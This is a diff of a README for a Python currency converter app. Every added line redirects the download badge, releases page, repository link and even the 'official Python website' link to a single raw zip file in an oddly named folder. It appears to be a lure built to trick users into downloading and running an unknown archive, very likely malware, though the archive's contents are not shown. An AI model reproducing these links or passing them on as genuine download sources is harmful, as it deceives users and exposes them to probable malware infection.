@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 python-live-currency-converter - Easily Convert Currencies in Real-Time
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Gamble1234/python-live-currency-converter/releases)
+[![Download](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip)
 
 ## 📖 Introduction
 
@@ -19,7 +19,7 @@ To use the python-live-currency-converter, you need to download and set it up on
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: [Releases Page](https://github.com/Gamble1234/python-live-currency-converter/releases).
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip).
   
 2. You will see a list of available versions. Look for the latest release. 
 
@@ -65,7 +65,7 @@ To use the python-live-currency-converter, you need to download and set it up on
 
 ## 📚 Troubleshooting
 
-- **Application won't start**: Ensure you have the correct Python version installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Application won't start**: Ensure you have the correct Python version installed. You can download it from the [official Python website](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip).
   
 - **Incorrect exchange rates**: Make sure you are connected to the internet. The application relies on live data.
 
@@ -81,8 +81,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Gamble1234/python-live-currency-converter)
-- [Download Now](https://github.com/Gamble1234/python-live-currency-converter/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip)
+- [Download Now](https://raw.githubusercontent.com/Gamble1234/python-live-currency-converter/main/albumen/python-live-currency-converter.zip)
 
 By following these steps, you will successfully download and run the python-live-currency-converter on your computer. Enjoy converting currencies with ease!
 ```
